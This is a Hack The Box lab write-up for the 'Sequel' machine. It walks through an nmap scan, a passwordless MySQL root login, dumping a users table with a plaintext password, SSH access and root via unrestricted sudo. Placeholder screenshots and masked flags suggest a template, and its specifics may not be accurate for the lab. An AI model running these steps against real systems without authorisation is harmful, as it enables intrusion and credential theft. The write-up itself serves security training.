# Hack The Box: Sequel

## Overview
- **IP Address:** 10.129.110.10
- **Difficulty:** Easy
- **Category:** Database / MySQL Exploitation
- **Completion Date:** September 9TH 2025

---

## 1. Reconnaissance

### Nmap Scan
Performed an initial scan to identify open ports:
```bash
nmap -sC -sV -oN nmap_initial.txt 10.129.110.10
```

**Scan Results:**
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4
3306/tcp open  mysql   MySQL 8.0.29-0ubuntu0.20.04.3
```

[Add screenshot: `screenshots/Nmap_scan.png`]

---

## 2. Enumeration

### Connecting to MySQL
Tested for default/empty credentials:
```bash
mysql -h 10.129.110.10 -u root
```
✅ Successfully connected without a password.

List databases:
```sql
SHOW DATABASES;
```
**Output:**
```
+--------------------+
| Database           |
+--------------------+
| information_schema |
| htb               |
| mysql             |
+--------------------+
```

Switch to `htb` database and check tables:
```sql
USE htb;
SHOW TABLES;
```
**Output:**
```
+-------+
| Table |
+-------+
| users |
+-------+
```

Dump the `users` table:
```sql
SELECT * FROM users;
```
**Output:**
```
+----+-------------+---------------+
| id | username    | password      |
+----+-------------+---------------+
| 1  | sequel_user | sequel_pass   |
+----+-------------+---------------+
```

[Add screenshot: `screenshots/mysql-creds.png`]

---

## 3. Exploitation

Login via SSH using discovered credentials:
```bash
ssh sequel_user@10.129.110.10
# Password: sequel_pass
```

✅ Access granted.

[Add screenshot: `screenshots/ssh-access.png`]

---

## 4. Privilege Escalation

Check sudo permissions:
```bash
sudo -l
```

**Output:**
```
User sequel_user may run the following commands on sequel:
    (ALL : ALL) ALL
```

Escalate to root:
```bash
sudo su
whoami
# root
```

[Add screenshot: `screenshots/root.png`]

---

## 5. Loot

- **User Flag:** `HTB{xxxxxxxxxxxxxxxxxxxx}`
- **Root Flag:** `HTB{xxxxxxxxxxxxxxxxxxxx}`

---

## 6. Lessons Learned
- Exposed MySQL services with default credentials are dangerous.  
- Always enumerate database users and permissions.  
- Misconfigured sudo permissions can lead to full root access.

---
